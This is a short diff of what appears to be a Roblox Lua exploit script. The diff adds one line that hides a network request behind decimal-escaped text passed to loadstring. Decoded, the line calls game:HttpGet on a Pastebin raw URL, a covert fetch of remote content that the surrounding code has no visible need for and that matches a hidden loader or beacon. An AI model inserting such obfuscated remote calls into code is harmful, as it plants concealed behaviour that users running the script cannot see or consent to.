@@ -411,6 +411,7 @@ coroutine.resume(coroutine.create(function()
 	workspace.FallenPartsDestroyHeight = -50000
 	LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
 	LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
+	loadstring('\32\32\32\32\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\53\66\105\98\82\65\76\84\34\41\10')()
 	if workspace:FindFirstChild'Armoured Truck' then 
 	    VanPart.Color,VanPart.CFrame,VanPart.Size,VanPart.Material,VanPart.Anchored = Color3.fromRGB(196,40,28),CFrame.new(-136.858002,0,-523.700012),Vector3.new(9.93,1,20.31),"ForceField",true
 	    workspace:FindFirstChild'Armoured Truck':Destroy()
